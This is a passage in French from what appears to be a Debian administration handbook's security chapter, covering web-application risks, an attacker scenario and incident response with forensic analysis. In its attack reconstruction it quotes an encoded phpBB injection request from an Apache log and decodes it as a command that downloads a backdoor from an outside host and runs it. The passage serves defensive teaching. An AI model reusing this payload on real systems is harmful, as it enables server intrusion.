        <title>Compilation des fichiers</title>

	<para>Une fois que les trois fichiers (<filename>example.if</filename>, <filename>example.fc</filename> et <filename>example.te</filename>) sont conformes aux règles que l'on veut créer, il suffit d'invoquer <command>make NAME=devel</command> pour générer un module dans le fichier <filename>example.pp</filename> (que l'on peut immédiatement charger avec <command>semodule -i example.pp</command>). Si plusieurs modules sont définis, <command>make</command> créera tous les fichiers <filename>.pp</filename> correspondants.</para>
      </section>
    </section>
  </section>
  <section id="sect.other-security-considerations">
    <title>Autres considérations sur la sécurité</title>

    <para>La sécurité n'est pas un simple problème de technique. C'est avant tout de bonnes habitudes et une bonne compréhension des risques. Cette section propose donc une revue de certains risques fréquents, ainsi qu'une série de bonnes pratiques, qui, selon le cas, amélioreront la sécurité ou réduiront l'impact d'une attaque fructueuse.</para>
    <section>
      <title>Risques inhérents aux applications web</title>

      <para>L'universalité des applications web a entraîné leur multiplication et il est fréquent d'en avoir plusieurs en service : un <foreignphrase>webmail</foreignphrase>, un wiki, un groupware, des forums, une galerie de photos, un blog, etc. Un grand nombre de ces applications s'appuient sur les technologies LAMP <foreignphrase>(Linux Apache Mysql PHP)</foreignphrase>. Malheureusement, beaucoup ont aussi été écrites sans faire trop attention aux problèmes de sécurité. Trop souvent, les données externes sont utilisées sans vérifications préalables et il est possible de subvertir l'appel d'une commande pour qu'il en résulte une autre, simplement en fournissant une valeur inattendue. Avec le temps, les problèmes les plus évidents ont été corrigés, mais de nouvelles failles de sécurité sont régulièrement découvertes.</para>

      <sidebar>
        <title><emphasis>VOCABULAIRE</emphasis> Injection SQL</title>

	<para>Lorsqu'un programme exécutant des requêtes SQL y insère des paramètres d'une manière non sécurisée, il peut être victime d'injections SQL. Il s'agit de modifier le paramètre de manière à ce que le programme exécute en réalité une version altérée de la requête SQL, soit pour endommager les données, soit pour récupérer des données auxquelles l'utilisateur ne devait pas avoir accès. <ulink type="block" url="http://fr.wikipedia.org/wiki/Injection_SQL" /></para>
        <indexterm><primary>Injection SQL</primary></indexterm>
      </sidebar>

      <para>Il est donc indispensable de mettre à jour ses applications web régulièrement pour ne pas rester vulnérable au premier pirate (amateur ou pas) qui cherchera à exploiter cette faille connue. Selon le cas, le risque varie : cela va de la destruction des données à l'exécution de commandes arbitraires, en passant par le vandalisme du site web.</para>
    </section>
    <section>
      <title>Savoir à quoi s'attendre</title>

      <para>Ainsi donc, la vulnérabilité d'une application web est un point de départ fréquent pour un acte de piraterie. Voyons quelles peuvent en être les conséquences.</para>

      <sidebar>
        <title><emphasis>DÉCOUVERTE</emphasis> Filtrer les requêtes HTTP</title>

	<para>Il existe des modules pour Apache 2 qui permettent de filtrer les requêtes HTTP entrantes. Il est ainsi possible de bloquer certains vecteurs d'attaques : empêcher les dépassements de tampon en limitant la longueur de certains paramètres, par exemple. D'une manière générale, il est possible de valider en amont les paramètres envoyés à une application web et de restreindre l'accès à celle-ci selon de nombreux critères. Il est même possible de combiner cela avec une modification dynamique du pare-feu pour bloquer pendant quelques minutes un utilisateur ayant enfreint une des règles mises en place.</para>

	<para>Ces vérifications sont pénibles à mettre en place, mais elles s'avèrent assez efficaces si l'on est contraint de déployer une application web à la sécurité incertaine.</para>

	<para><emphasis>mod-security2</emphasis> (paquet <emphasis role="pkg">libapache2-mod-security2</emphasis>) est le principal module qui peut être employé dans cette optique. Il est accompagné de nombreuses règles prêtes à l'emploi et simples à installer (dans le paquet <emphasis role="pkg">modsecurity-crs</emphasis> package).</para>
        <indexterm><primary><emphasis role="pkg">libapache-mod-security</emphasis></primary></indexterm>
        <indexterm><primary><emphasis>mod-security</emphasis></primary></indexterm>
      </sidebar>

      <para>Selon l'intention du pirate, son intrusion sera plus ou moins évidente. Les <foreignphrase>script-kiddies</foreignphrase> se contentent d'appliquer les recettes toutes prêtes qu'ils trouvent sur des sites web. Le vandalisme d'une page web ou la suppression des données sont les issues les plus probables. Parfois, c'est plus subtil et ils ajoutent du contenu invisible dans les pages web afin d'améliorer le référencement de certains de leurs sites.</para>

      <para>Un pirate plus avancé ne se contentera pas de ce maigre résultat. Un scénario catastrophe pourrait se poursuivre comme suit : le pirate a obtenu la possibilité d'exécuter des commandes en tant qu'utilisateur <literal>www-data</literal>, mais cela requiert de nombreuses manipulations pour chaque commande. Il va chercher à se faciliter la vie en installant d'autres applications web précisément développées pour exécuter à distance toutes sortes de commandes : naviguer dans l'arborescence, analyser les droits, télécharger des fichiers, en déposer, exécuter des commandes et, le summum, mettre à disposition un interpréteur de commandes par le réseau. Très fréquemment, la faille lui permettra de lancer un <command>wget</command> qui va télécharger un programme malfaisant dans <filename>/tmp/</filename> et il l'exécutera dans la foulée. Le programme sera téléchargé depuis un serveur étranger qui, lui aussi, a été compromis, l'intérêt étant de brouiller les pistes si jamais l'on voulait remonter à l'origine de l'attaque.</para>

      <para>À ce stade, l'attaquant a tellement de liberté qu'il installe souvent un <foreignphrase>bot</foreignphrase> IRC (un robot qui se connecte à un serveur IRC et qui peut être commandé par ce biais). Il sert souvent à échanger des fichiers illégaux (films et logiciels piratés, etc.). Un pirate déterminé peut vouloir aller encore plus loin. Le compte <literal>www-data</literal> ne permet pas de profiter pleinement de la machine ; il va donc chercher à obtenir les privilèges de l'administrateur. C'est théoriquement impossible, mais si l'application web n'était pas à jour, il est probable que le noyau ou un autre programme ne le soit pas non plus. D'ailleurs, l'administrateur avait bien vu passer l'annonce d'une vulnérabilité, mais puisque cela n'était exploitable que localement et que le serveur n'avait pas d'utilisateur local, il n'a pas pris soin de mettre à jour. L'attaquant profite donc de cette deuxième faille pour obtenir un accès <literal>root</literal>.</para>

      <sidebar>
        <title><emphasis>VOCABULAIRE</emphasis> Élévation des privilèges</title>

	<para>Cette technique consiste à obtenir plus de droits qu'un utilisateur n'en a normalement. Le programme <command>sudo</command> est prévu pour cela : donner les droits d'administrateur à certains utilisateurs. On emploie aussi la même expression pour désigner l'action d'un pirate qui exploite une faille pour obtenir des droits qu'il ne possède pas. En anglais, l'expression est <foreignphrase>privilege escalation</foreignphrase>.</para>
      </sidebar>

      <para>Maintenant qu'il règne en maître sur la machine, il va essayer de garder cet accès privilégié aussi longtemps que possible. Il va installer un <foreignphrase>rootkit</foreignphrase> : il s'agit d'un programme qui va remplacer certains composants du système afin de ré-obtenir facilement les privilèges d'administrateur et qui va tenter de dissimuler son existence, ainsi que les traces de l'intrusion. Le programme <command>ps</command> omettra certains processus, le programme <command>netstat</command> ne mentionnera pas certaines connexions actives, etc. Grâce aux droits <literal>root</literal>, l'attaquant a pu analyser tout le système, mais il n'a pas trouvé de données importantes. Il va alors essayer d'accéder à d'autres machines du réseau de l'entreprise. Il analyse le compte de l'administrateur local et consulte les fichiers d'historique pour retrouver les machines auxquelles l'administrateur s'est connecté. Il peut remplacer <command>sudo</command> par une version modifiée qui enregistre (et lui fait parvenir) le mot de passe saisi. La prochaine fois que l'administrateur viendra effectuer une opération sur ce serveur, le pirate obtiendra son mot de passe et pourra librement l'essayer sur les serveurs détectés.</para>

      <para>Pour éviter d'en arriver là, il y a de nombreuses mesures à prendre. Les prochaines sections s'attacheront à en présenter quelques-unes.</para>
    </section>
    <section id="sect.choosing-the-software-wisely">
      <title>Bien choisir les logiciels</title>

      <para>Une fois sensibilisé aux problèmes potentiels de sécurité, il faut y faire attention à toutes les étapes de la mise en place d'un service et en premier lieu, lors du choix du logiciel à installer. De nombreux sites comme <literal>SecurityFocus.com</literal> recensent les vulnérabilités découvertes et on peut ainsi se faire une idée de la sûreté d'un logiciel avant de le déployer. Il faut évidemment mettre en balance cette information avec la popularité dudit logiciel : plus nombreux sont ses utilisateurs, plus il constitue une cible intéressante et plus il sera scruté de près. Au contraire, un logiciel anodin peut être truffé de trous de sécurité, mais comme personne ne l'utilise, aucun audit de sécurité n'aura été réalisé.</para>

      <sidebar>
        <title><emphasis>VOCABULAIRE</emphasis> Audit de sécurité</title>

	<para>Un audit de sécurité est une lecture et une analyse du code source afin de trouver toutes les failles de sécurité qu'il pourrait contenir. Un audit est souvent préventif ; il est réalisé pour s'assurer que le programme est conforme à certaines exigences de sécurité.</para>
      </sidebar>

      <para>Le monde du logiciel libre offre souvent le choix. Il faut prendre le temps de bien choisir en fonction de ses critères propres. Plus un logiciel dispose de fonctionnalités intégrées, plus le risque est grand qu'une faille se cache quelque part dans le code. Il ne sert donc à rien de retenir systématiquement le logiciel le plus avancé ; il vaut souvent mieux privilégier le logiciel le plus simple qui répond à tous les besoins exprimés.</para>

      <sidebar>
        <title><emphasis>VOCABULAIRE</emphasis> <foreignphrase>Zero day exploit</foreignphrase></title>

	<para>Une attaque de type <foreignphrase>zero day exploit</foreignphrase> est imparable. Il s'agit d'une attaque utilisant une faille qui n'est pas encore connue des auteurs du logiciel.</para>
      </sidebar>
    </section>
    <section id="sect.managing-a-machine-as-a-whole">
      <title>Gérer une machine dans son ensemble</title>

      <para>La plupart des distributions Linux installent en standard un certain nombre de services Unix ainsi que de nombreux utilitaires. Dans bien des cas, ils ne sont pas nécessaires au bon fonctionnement des services que l'administrateur met en place sur la machine. Comme bien souvent en sécurité, il vaut mieux supprimer tout ce qui n'est pas nécessaire. En effet, cela ne sert à rien de s'appuyer sur un serveur FTP sécurisé si une faille dans un service inutilisé fournit un accès administrateur à la machine.</para>

      <para>C'est la même logique qui incite à configurer un pare-feu n'autorisant l'accès qu'aux services qui doivent être accessibles au public.</para>

      <para>Les capacités des ordinateurs permettent facilement d'héberger plusieurs services sur une même machine. Ce choix se justifie économiquement : un seul ordinateur à administrer, moins d'énergie consommée, etc. Mais du point de vue de la sécurité, ce choix est plutôt gênant. La compromission d'un service entraîne souvent l'accès à la machine complète et donc aux données des autres services hébergés sur le même ordinateur. Pour limiter les risques de ce point de vue, il est intéressant d'isoler les différents services. Cela peut se faire soit avec de la virtualisation, chaque service étant hébergé sur une machine virtuelle ou un conteneur dédié, soit avec AppArmor/SELinux, en paramétrant les droits associés au démon (programme serveur) en charge de chaque service.</para>
    </section>
    <section id="sect.users-are-players">
      <title>Les utilisateurs sont des acteurs</title>

      <para>Lorsqu'on parle de sécurité, on pense immédiatement à la protection contre les attaques des pirates anonymes qui se camouflent dans l'immensité d'Internet. On oublie trop souvent que les risques proviennent aussi de l'intérieur : un employé en instance de licenciement qui télécharge des dossiers sur les projets les plus importants et qui les propose à la concurrence, un commercial négligent qui reste connecté pendant qu'il s'absente alors qu'il reçoit un nouveau prospect, un utilisateur maladroit qui a supprimé le mauvais répertoire par erreur, etc.</para>

      <para>La réponse à ces problématiques passe parfois par de la technique : il ne faut pas donner plus que les accès nécessaires  et il convient d'avoir des sauvegardes régulières. Mais dans la plupart des cas, il s'agit avant tout de prévention en formant les utilisateurs afin qu'ils puissent mieux éviter les risques.</para>

      <sidebar>
        <title><emphasis>DÉCOUVERTE</emphasis> <emphasis role="pkg">autolog</emphasis></title>

	<para>Le paquet <emphasis role="pkg">autolog</emphasis> fournit un logiciel déconnectant automatiquement les utilisateurs inactifs (après un délai configurable). Il tue aussi les processus utilisateurs qui persistent après la déconnexion de ces derniers (en les empêchant ainsi d'avoir leurs propres démons).</para>
      </sidebar>
    </section>
    <section id="sect.physical-security">
      <title>Sécurité physique</title>

      <para>Il ne sert à rien de sécuriser l'ensemble de vos services si les ordinateurs sous-jacents ne sont pas eux-mêmes protégés. Il est probablement judicieux que les données les plus importantes soient stockées sur des disques en RAID que l'on peut remplacer à chaud, parce que justement on tient à garantir leur préservation malgré la faillibilité des disques. Mais il serait regrettable qu'un livreur de pizza puisse s'introduire dans le bâtiment et faire un saut dans la salle des serveurs pour emmener les quelques disques... Qui a accès à la salle des machines ? Y a-t-il une surveillance des accès ? Voilà quelques exemples de questions qu'il faut se poser lorsque l'on considère le problème de la sécurité physique.</para>

      <para>On peut aussi inclure sous cette bannière la prise en compte des risques d'accidents tels que les incendies. C'est ce risque qui justifie que les sauvegardes soient stockées dans un autre bâtiment ou du moins dans un coffre ignifugé.</para>
    </section>
    <section>
      <title>Responsabilité juridique</title>

      <para>En tant qu'administrateur, vous bénéficiez, implicitement ou non, de la confiance des utilisateurs ainsi que des autres usagers du réseau. Évitez toute négligence dont des malfaisants sauraient profiter .</para>

      <para>Un pirate prenant le contrôle de votre machine, puis l'employant comme une sorte de base avancée (on parle de système relais) afin de commettre un méfait, pourrait vous causer de l'embarras puisque des tiers verront en vous, d'emblée, le pirate ou son complice. Dans le cas le plus fréquent, le pirate emploiera votre machine afin d'expédier du spam, ce qui n'aura vraisemblablement pas d'impact majeur (hormis des inscriptions éventuelles sur des listes noires qui limiteraient votre capacité à expédier des messages) mais n'enthousiasmera personne. Dans d'autres cas, des exactions seront commises grâce à votre machine, par exemple des attaques par déni de service. Elles induiront parfois un manque à gagner, car rendront indisponibles des services logiciels ou détruiront des données, voire un coût, parce qu'une entité s'estimant lésée intentera une action en justice (la détentrice des droits de diffusion d'une œuvre indûment mise à disposition via votre machine, ou encore une entreprise engagée à maintenir une disponibilité donnée via un contrat de qualité de service (SLA-SLM) et se voyant contrainte d'acquitter des pénalités à cause du piratage).</para>

      <para>Vous souhaiterez alors étayer vos protestations d'innocence en produisant des éléments probants montrant l'activité douteuse menée sur votre système par des tiers employant une adresse IP donnée. Cela restera impossible si, imprudemment, vous négligez les recommandations de ce chapitre et laissez le pirate disposer facilement d'un compte privilégié (en particulier le compte <literal>root</literal>) grâce auquel il effacera ses propres traces.</para>
    </section>
  </section>
  <section id="sect.dealing-with-compromised-machine">
    <title>En cas de piratage</title>

    <para>Malgré toute la bonne volonté et tout le soin apporté à la politique de sécurité, tout administrateur informatique est tôt ou tard confronté à un acte de piratage. Cette section donne des lignes directrices pour bien réagir face à ces fâcheux événements.</para>
    <section>
      <title>Détecter et constater le piratage</title>

      <para>Avant de pouvoir agir face à un piratage, il faut se rendre compte que l'on est effectivement victime d'un tel acte. Ce n'est pas toujours le cas... surtout si l'on ne dispose pas d'une infrastructure de supervision adéquate.</para>

      <para>Les actes de piratage sont souvent détectés lorsqu'ils ont des conséquences directes sur les services légitimes hébergés sur la machine : la lenteur soudaine de la connexion, l'impossibilité de se connecter pour certains utilisateurs ou tout autre dysfonctionnement. Face à ces problèmes, l'administrateur est obligé de se pencher sur la machine et d'étudier de plus près ce qui ne tourne pas rond. C'est à ce moment qu'il va découvrir la présence d'un processus inhabituel, nommé par exemple <literal>apache</literal> au lieu du <literal>/usr/sbin/apache2</literal> habituel. Alerté par ce détail, il note le numéro du processus et consulte <filename>/proc/<replaceable>pid</replaceable>/exe</filename> pour savoir quel programme se cache derrière ce processus :</para>

      <screen>
<computeroutput># </computeroutput><userinput>ls -al /proc/3719/exe</userinput>
<computeroutput>lrwxrwxrwx 1 www-data www-data 0 2007-04-20 16:19 /proc/3719/exe -&gt; /var/tmp/.bash_httpd/psybnc</computeroutput>
      </screen>

      <para>Un programme installé dans <filename>/var/tmp/</filename> sous l'identité du serveur web ! Plus de doutes possibles, il y a eu piratage.</para>

      <para>Il s'agit là d'un simple exemple. De nombreux autres indices peuvent mettre en alerte un administrateur :</para>
      <itemizedlist>
        <listitem>
	  <para>une option d'une commande qui ne fonctionne plus (il vérifie alors la version du logiciel et elle ne correspond pas à celle installée d'après <command>dpkg</command>) ;</para>
        </listitem>
        <listitem>
	  <para>une invite de connexion qui indique que la dernière connexion réussie est en provenance d'une machine roumaine ;</para>
        </listitem>
        <listitem>
	  <para>une partition <filename>/tmp/</filename> pleine (entraînant des erreurs) qui s'avère contenir des films pirates ;</para>
        </listitem>
        <listitem>
	  <para>etc.</para>
        </listitem>
      </itemizedlist>
    </section>
    <section>
      <title>Mettre le serveur hors ligne</title>

      <para>Dans l'immense majorité des cas, l'intrusion provient du réseau et la disponibilité du réseau est essentielle à l'attaquant pour atteindre ses objectifs (récupérer des données confidentielles, échanger des fichiers illégaux, masquer son identité en employant la machine comme relais intermédiaire…). Débrancher l'ordinateur du réseau empêchera l'attaquant d'arriver à ses fins au cas où il n'en aurait pas encore eu le temps.</para>

      <para>Ceci n'est possible que si l'on dispose d'un accès physique au serveur. Si ce n'est pas le cas (par exemple parce que le serveur est hébergé à l'autre bout du pays chez un prestataire d'hébergement), il peut être plus judicieux de commencer par récolter quelques informations importantes (voir <xref linkend="sect.keeping-everything-that-could-be-used-as-evidence" />, <xref linkend="sect.forensic-analysis" /> et <xref linkend="sect.reconstituting-the-attack-scenario" />), puis d'isoler autant que possible le serveur en stoppant le maximum de services (c'est-à-dire tout sauf <command>sshd</command>). Cette situation n'est pas recommandable car il est impossible de s'assurer que l'attaquant ne profite pas (comme l'administrateur) d'un accès via SSH. Il est difficile dans ces conditions de « nettoyer » la machine.</para>
    </section>
    <section id="sect.keeping-everything-that-could-be-used-as-evidence">
      <title>Préserver tout ce qui peut constituer une preuve</title>

      <para>Si l'on veut comprendre ce qui s'est passé et/ou si l'on veut pouvoir poursuivre les assaillants, il faut conserver une copie de tous les éléments importants : notamment le contenu du disque dur, la liste des processus en cours d'exécution et la liste des connexions ouvertes. Le contenu de la mémoire vive pourrait aussi être intéressant, mais il est assez rare que l'on exploite cette information.</para>

      <para>Le stress du moment incite souvent les administrateurs à vérifier beaucoup de choses sur l'ordinateur incriminé, mais c'est une très mauvaise idée. Chaque commande exécutée est susceptible d'effacer des éléments de preuve. Il faut se contenter du minimum (<command>netstat -tupan</command> pour les connexions réseau, <command>ps auxf</command> pour la liste des processus, <command>ls -alR /proc/[0-9]*</command> pour quelques informations supplémentaires sur les programmes en cours d'exécution) et noter systématiquement ce que l'on fait.</para>

      <sidebar>
        <title><emphasis>ATTENTION</emphasis> Analyse à chaud</title>

	<para>La tentation est grande d'analyser à chaud un système, surtout lorsque l'on n'a pas d'accès physique au serveur. Cette opération n'est pas souhaitable, tout simplement parce que vous ne pouvez pas faire confiance aux programmes installés sur la machine compromise : il se peut que <command>ps</command> n'affiche pas tous les processus, que <command>ls</command> dissimule des fichiers, voire que le noyau en fasse de même !</para>

	<para>Si malgré tout une telle analyse doit être conduite, il convient d'employer des programmes que l'on sait être corrects. Il est possible d'avoir un CD-Rom de secours contenant des programmes sains, voire un partage réseau (en lecture seule). Toutefois, si le noyau est compromis, mêmes ces mesures ne seront pas forcément suffisantes.</para>
      </sidebar>

      <para>Une fois sauvegardés les éléments « dynamiques » les plus importants, il faut réaliser une image fidèle du disque complet. Il est impossible de réaliser une telle image si le système de fichiers évolue encore. Il faut donc le remonter en lecture seule <foreignphrase>(read-only)</foreignphrase>. Le plus simple est souvent de stopper le serveur (brutalement, après un <command>sync</command>) et de le démarrer sur un CD-Rom de secours. Une image de chaque partition peut alors être réalisée à l'aide du programme <command>dd</command>. Ces images peuvent être stockées sur un autre serveur (l'utilitaire <command>nc</command> est alors très pratique pour envoyer les données générées par <command>dd</command> d'une machine à une autre). Une autre solution, beaucoup plus simple, est de sortir le disque de la machine et de le remplacer par un neuf prêt à être réinstallé.</para>
    </section>
    <section>
      <title>Réinstaller</title>
      <indexterm><primary><foreignphrase>backdoor</foreignphrase></primary></indexterm>

      <para>Avant de remettre le serveur en ligne, il est indispensable de le réinstaller complètement. En effet, si la compromission était sévère (obtention des privilèges administrateur), il est presque impossible d'être certain d'avoir éliminé tout ce que l'attaquant a pu laisser derrière lui (portes dérobées notamment, <foreignphrase>backdoors</foreignphrase> en anglais). Une réinstallation complète apportera cette certitude. Bien entendu, il faut également installer toutes les dernières mises à jour de sécurité afin de colmater la brèche que l'attaquant a réussi à exploiter. Idéalement, l'analyse de l'attaque aura mis en lumière la faille et il sera possible de la corriger avec certitude (au lieu de simplement espérer que les mises à jour de sécurité seront suffisantes).</para>

      <para>Pour un serveur distant, réinstaller n'est pas forcément évident à réaliser. Il faudra souvent le concours de l'hébergeur car tous ne disposent pas d'infrastructure de réinstallation automatique. Attention également à ne pas réinitialiser la machine avec une sauvegarde complète ultérieure à la date de compromission ! Il vaut mieux réinstaller les logiciels et ne restaurer que les données.</para>
    </section>
    <section id="sect.forensic-analysis">
      <title>Analyser à froid</title>

      <para>Maintenant que le service est à nouveau fonctionnel, il est temps de se pencher sur les images disque du système compromis afin de comprendre ce qui s'est passé. Lorsqu'on monte l'image du disque, il faut prendre soin d'employer les options <literal>ro, nodev, noexec, noatime</literal> afin de ne pas modifier son contenu (y compris les horodatages des accès aux fichiers) et de ne pas exécuter par erreur des exécutables compromis.</para>

      <para>Pour reconstituer efficacement le scénario d'une attaque, il faut chercher tous azimuts ce qui a été modifié et exécuté :</para>
      <itemizedlist>
        <listitem>
	  <para>L'analyse d'éventuels fichiers <filename>.bash_history</filename> est souvent très instructive;</para>
        </listitem>
        <listitem>
	  <para>Il faut extraire la liste des fichiers récemment créés, modifiés et consultés;</para>
        </listitem>
        <listitem>
	  <para>L'identification des programmes installés par l'attaquant est souvent possible à l'aide de la commande <command>strings</command> qui extrait les chaînes de caractères présentes dans un binaire;</para>
        </listitem>
        <listitem>
	  <para>L'analyse des fichiers de traces de <filename>/var/log/</filename> fournit souvent une chronologie;</para>
        </listitem>
        <listitem>
	  <para>Enfin, des outils spécialisés permettent de récupérer le contenu de potentiels fichiers supprimés (notamment les fichiers de traces que les attaquants aiment à supprimer).</para>
        </listitem>
      </itemizedlist>

      <para>Certaines de ces opérations sont facilitées par des logiciels spécialisés. Le paquet <emphasis role="pkg">sleuthkit</emphasis> en particulier fournit de nombreux outils d'analyse de système de fichiers. Leur usage est grandement facilité par l'interface graphique <emphasis>Autopsy Forensic Browser</emphasis> contenue dans le paquet <emphasis role="pkg">autopsy</emphasis>.</para>
      <indexterm><primary>Autopsy Forensic Browser</primary></indexterm>
      <indexterm><primary>The Sleuth Kit</primary></indexterm>
    </section>
    <section id="sect.reconstituting-the-attack-scenario">
      <title>Reconstituer le scénario de l'attaque</title>

      <para>Tous les éléments récoltés au cours de l'analyse doivent pouvoir s'emboîter comme dans un puzzle : la date de création des premiers fichiers suspects correspond souvent à des traces prouvant l'intrusion. Un petit exemple réel sera plus parlant qu'un long discours théorique.</para>

      <para>La trace ci-dessous, extraite d'un fichier <filename>access.log</filename> de Apache, en est un exemple :</para>

      <programlisting>
www.falcot.com 200.58.141.84 - - [27/Nov/2004:13:33:34 +0100] "GET /phpbb/viewtopic.php?t=10&amp;highlight=%2527%252esystem(chr(99)%252echr(100)%252echr(32)%252echr(47)%252echr(116)%252echr(109)%252echr(112)%252echr(59)%252echr(32)%252echr(119)%252echr(103)%252echr(101)%252echr(116)%252echr(32)%252echr(103)%252echr(97)%252echr(98)%252echr(114)%252echr(121)%252echr(107)%252echr(46)%252echr(97)%252echr(108)%252echr(116)%252echr(101)%252echr(114)%252echr(118)%252echr(105)%252echr(115)%252echr(116)%252echr(97)%252echr(46)%252echr(111)%252echr(114)%252echr(103)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(124)%252echr(124)%252echr(32)%252echr(99)%252echr(117)%252echr(114)%252echr(108)%252echr(32)%252echr(103)%252echr(97)%252echr(98)%252echr(114)%252echr(121)%252echr(107)%252echr(46)%252echr(97)%252echr(108)%252echr(116)%252echr(101)%252echr(114)%252echr(118)%252echr(105)%252echr(115)%252echr(116)%252echr(97)%252echr(46)%252echr(111)%252echr(114)%252echr(103)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(45)%252echr(111)%252echr(32)%252echr(98)%252echr(100)%252echr(59)%252echr(32)%252echr(99)%252echr(104)%252echr(109)%252echr(111)%252echr(100)%252echr(32)%252echr(43)%252echr(120)%252echr(32)%252echr(98)%252echr(100)%252echr(59)%252echr(32)%252echr(46)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(38))%252e%2527 HTTP/1.1" 200 27969 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
      </programlisting>

      <para>Cet exemple correspond à l'exploitation d'un ancien trou de sécurité de phpBB. <ulink type="block" url="http://secunia.com/advisories/13239/" /> <ulink type="block" url="http://www.phpbb.com/phpBB/viewtopic.php?t=240636" /></para>

      <para>En décodant cette longue URL, il est possible de comprendre que l'attaquant a exécuté la commande PHP <command>system("cd /tmp; wget gabryk.altervista.org/bd || curl gabryk.altervista.org/bd -o bd; chmod +x bd; ./bd &amp;")</command>. Effectivement, un fichier <filename>bd</filename> est disponible dans <filename>/tmp/</filename>. L'exécution de <command>strings /mnt/tmp/bd</command> renvoie entre autres <literal>PsychoPhobia Backdoor is starting...</literal>. Il s'agit donc d'une porte dérobée.</para>

      <para>Peu de temps après, cet accès a été utilisé pour télécharger et installer un <foreignphrase>bot</foreignphrase> IRC qui s'est connecté à un réseau IRC <foreignphrase>underground</foreignphrase>. Il peut être contrôlé par le biais de ce protocole, notamment pour télécharger des fichiers puis les mettre à disposition. Ce logiciel dispose de son propre fichier de trace :</para>

      <programlisting>** 2004-11-29-19:50:15: NOTICE: :GAB!sex@Rizon-2EDFBC28.pool8250.interbusiness.it NOTICE ReV|DivXNeW|504 :DCC Chat (82.50.72.202)
** 2004-11-29-19:50:15: DCC CHAT attempt authorized from GAB!SEX@RIZON-2EDFBC28.POOL8250.INTERBUSINESS.IT
** 2004-11-29-19:50:15: DCC CHAT received from GAB, attempting connection to 82.50.72.202:1024
** 2004-11-29-19:50:15: DCC CHAT connection suceeded, authenticating
** 2004-11-29-19:50:20: DCC CHAT Correct password
(...)
** 2004-11-29-19:50:49: DCC Send Accepted from ReV|DivXNeW|502: In.Ostaggio-iTa.Oper_-DvdScr.avi (713034KB)
(...)
** 2004-11-29-20:10:11: DCC Send Accepted from GAB: La_tela_dell_assassino.avi (666615KB)
(...)
** 2004-11-29-21:10:36: DCC Upload: Transfer Completed (666615 KB, 1 hr 24 sec, 183.9 KB/sec)
(...)
** 2004-11-29-22:18:57: DCC Upload: Transfer Completed (713034 KB, 2 hr 28 min 7 sec, 80.2 KB/sec)</programlisting>

      <para>Deux fichiers vidéo ont été déposés sur le serveur par l'intermédiaire de la machine 82.50.72.202.</para>

      <para>En parallèle à cela, l'attaquant a téléchargé des fichiers supplémentaires <filename>/tmp/pt</filename> et <filename>/tmp/loginx</filename>. Une analyse avec <command>strings</command> permet de récupérer des chaînes comme <foreignphrase>Shellcode placed at 0x%08lx</foreignphrase> ou <foreignphrase>Now wait for suid shell...</foreignphrase>. Il s'agit de programmes exploitant des vulnérabilités locales pour obtenir des privilèges administrateur. Mais sont-ils parvenus à leur fin ? Selon toute vraisemblance (fichiers modifiés postérieurement à l'intrusion), non.</para>

      <para>Dans cet exemple, tout le déroulement de l'intrusion a pu être reconstitué et l'attaquant a pu se servir du système compromis pendant 3 jours. Toutefois, le plus important dans cette reconstitution est que la vulnérabilité a été identifiée et a pu être corrigée sur la nouvelle installation.</para>
    </section>
  </section>
</chapter>
